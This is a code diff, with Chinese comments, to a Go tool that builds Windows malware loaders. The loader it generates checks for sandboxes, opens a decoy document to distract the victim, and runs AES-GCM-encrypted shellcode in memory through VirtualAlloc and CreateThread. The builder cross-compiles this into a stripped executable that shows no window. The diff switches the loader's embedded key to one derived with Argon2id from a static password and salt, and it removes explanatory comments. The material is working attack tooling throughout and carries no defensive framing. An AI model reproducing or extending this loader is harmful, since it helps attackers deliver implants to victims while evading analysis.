@@ -7,6 +7,7 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"flag"
+	"gofilepacker/internal/keymgr" // 新增导入
 	"io"
 	"log"
 	"os"
@@ -27,6 +28,8 @@ const logo = `
 `
 
 // loaderTemplate 是最终加载器可执行文件的 Go 源代码模板。
+// v1.1 更新: 移除 AES 密钥常量，替换为 Salt 常量。
+// AES 密钥现在在运行时使用 Argon2id 派生。
 const loaderTemplate = `
 //go:build windows
 // +build windows
@@ -39,27 +42,43 @@ import (
 	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
+	"golang.org/x/crypto/argon2" // 新增导入
+	"golang.org/x/sys/windows"
 	"os"
 	"path/filepath"
 	"runtime"
 	"time"
 	"unsafe"
-	"golang.org/x/sys/windows"
 )
 
 // 这些常量由生成器在编译时动态注入。
 const (
 	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
 	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
-	aesKeyBase64             = "{{.Key}}"
+	aesSaltBase64            = "{{.Salt}}" // 已修改: 用 Salt 替换了 Key
 	decoyFileName            = "{{.DecoyFileName}}"
 )
 
-// decryptAESGCM 使用 AES-256-GCM 解密 Base64 编码的数据。
-func decryptAESGCM(encodedCiphertext, encodedKey string) ([]byte, error) {
-	key, err := base64.StdEncoding.DecodeString(encodedKey)
-	if err != nil { return nil, fmt.Errorf("key decoding failed: %v", err) }
-	
+// decryptAESGCM 使用通过 Argon2id 从 Salt 派生出的 AES 密钥来解密 Base64 编码的数据。
+func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
+	// 从 Salt 使用 Argon2id 派生 AES 密钥
+	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
+	if err != nil {
+		return nil, fmt.Errorf("salt decoding failed: %v", err)
+	}
+
+    // 这些参数必须与生成器的 keymgr 包中的参数匹配
+    const (
+        argon2Time    = 1
+        argon2Memory  = 64 * 1024
+        argon2Threads = 4
+        keyLength     = 32
+    )
+    var argon2Password = []byte("gophantom-static-secret-for-derivation")
+
+	key := argon2.IDKey(argon2Password, salt, argon2Time, argon2Memory, argon2Threads, keyLength)
+
+	// 后续的解密流程保持不变
 	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
 	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }
 
@@ -76,14 +95,12 @@ func decryptAESGCM(encodedCiphertext, encodedKey string) ([]byte, error) {
 	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
-// antiSandboxChecks 执行基本的反沙箱环境检查，以规避自动化分析。
+// antiSandboxChecks 执行基本的反沙箱环境检查。
 func antiSandboxChecks() {
-	// 沙箱环境通常分配较少的CPU核心。
 	if runtime.NumCPU() < 2 {
 		os.Exit(0)
 	}
 
-	// 沙箱环境通常分配较少的物理内存。
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
 	
@@ -104,38 +121,34 @@ func antiSandboxChecks() {
 	
 	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
 	if ret != 0 {
-		// 若物理内存小于 4GB，则判定为沙箱环境并退出。
 		if memStatex.TotalPhys/1024/1024/1024 < 4 {
 			os.Exit(0)
 		}
 	}
 }
 
-// executeShellcode 分配内存，复制并以 "Fire and Forget" 模式执行 shellcode。
+// executeShellcode 分配内存，复制并执行 shellcode。
 func executeShellcode(shellcode []byte) {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	virtualAlloc := kernel32.NewProc("VirtualAlloc")
 	createThread := kernel32.NewProc("CreateThread")
 
-	// 使用 VirtualAlloc 在当前进程中分配一块具有读、写、执行权限的内存。
 	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
-		return // 分配失败则静默退出，不暴露行为。
+		return
 	}
 
-	// 将 shellcode 复制到新分配的内存中。
 	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
 	copy(dst, shellcode)
 	
-	// 使用 CreateThread 在新线程中执行 shellcode，实现与主线程分离。
 	createThread.Call(0, 0, addr, 0, 0, 0)
 }
 
 func main() {
 	antiSandboxChecks()
 
-	// 解密并执行诱饵文件，迷惑目标用户。
-	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesKeyBase64)
+    // 已修改: 对 decryptAESGCM 的调用现在传递 Salt
+	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64)
 	if err == nil {
 		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
 		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
@@ -145,22 +158,21 @@ func main() {
 		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
 	}
 	
-	// 在后台解密并执行核心荷载。
-	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesKeyBase64)
+	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64)
 	if err == nil {
 		executeShellcode(shellcode)
 	}
 
-	// 短暂休眠以确保诱饵文件有足够时间弹出，增强伪装效果。
 	time.Sleep(3 * time.Second)
 }
 `
 
 // TemplateData 用于向模板中注入数据。
+// 已修改: 将 Key 替换为 Salt。
 type TemplateData struct {
 	EncryptedPayload string
 	EncryptedDecoy   string
-	Key              string
+	Salt             string
 	DecoyFileName    string
 }
 
@@ -186,16 +198,14 @@ func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
 }
 
 func main() {
-	log.SetFlags(0) // 移除日志前缀，使 Logo 输出更干净
+	log.SetFlags(0)
 	log.Println(logo)
 
-	// --- 参数定义 ---
 	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
 	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
 	flag.Parse()
 
-	// --- 参数校验 ---
 	if *decoyFile == "" || *payloadFile == "" {
 		log.Println("\nError: Both -decoy and -payload flags are required.")
 		log.Println("Usage:")
@@ -203,7 +213,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	// --- 文件读取 ---
 	decoyBytes, err := os.ReadFile(*decoyFile)
 	if err != nil {
 		log.Fatalf("[-] Failed to read decoy file: %v", err)
@@ -214,30 +223,31 @@ func main() {
 		log.Fatalf("[-] Failed to read payload file: %v", err)
 	}
 
-	// --- 加密流程 ---
-	log.Println("[+] Generating unique AES-256-GCM key...")
-	aesKey := make([]byte, 32) // AES-256 需要 32 字节的密钥
-	if _, err := rand.Read(aesKey); err != nil {
-		log.Fatalf("[-] Failed to generate AES key: %v", err)
+	// --- 已修改: 密钥派生流程 ---
+	log.Println("[+] Deriving AES-256 key using Argon2id...")
+	// keymgr 会处理从 GOPHANTOM_SALT 读取或生成新随机 Salt 的逻辑。
+	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
+	if err != nil {
+		log.Fatalf("[-] Failed to derive key and salt: %v", err)
 	}
 
-	log.Println("[+] Encrypting decoy file with shared key...")
+	log.Println("[+] Encrypting decoy file with derived key...")
 	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey)
 	if err != nil {
 		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
 	}
 
-	log.Println("[+] Encrypting payload file with the same shared key...")
+	log.Println("[+] Encrypting payload file with the same derived key...")
 	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey)
 	if err != nil {
 		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
 	}
 
-	// --- 模板填充 ---
+	// --- 已修改: 模板填充 ---
 	data := TemplateData{
 		EncryptedPayload: encryptedShellcode,
 		EncryptedDecoy:   encryptedDecoy,
-		Key:              base64.StdEncoding.EncodeToString(aesKey),
+		Salt:             base64.StdEncoding.EncodeToString(salt), // 将 Salt 传递给模板
 		DecoyFileName:    filepath.Base(*decoyFile),
 	}
 
@@ -252,7 +262,6 @@ func main() {
 		log.Fatalf("[-] Failed to execute template: %v", err)
 	}
 
-	// --- 编译流程 ---
 	tmpfile, err := os.CreateTemp("", "loader-*.go")
 	if err != nil {
 		log.Fatalf("[-] Failed to create temp file: %v", err)
@@ -267,9 +276,6 @@ func main() {
 	}
 
 	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
-	// -s: 禁用符号表
-	// -w: 禁用 DWARF 调试信息
-	// -H windowsgui: 编译为 Windows GUI 程序，运行时不显示控制台窗口
 	ldflags := "-s -w -H windowsgui"
 	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
 	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
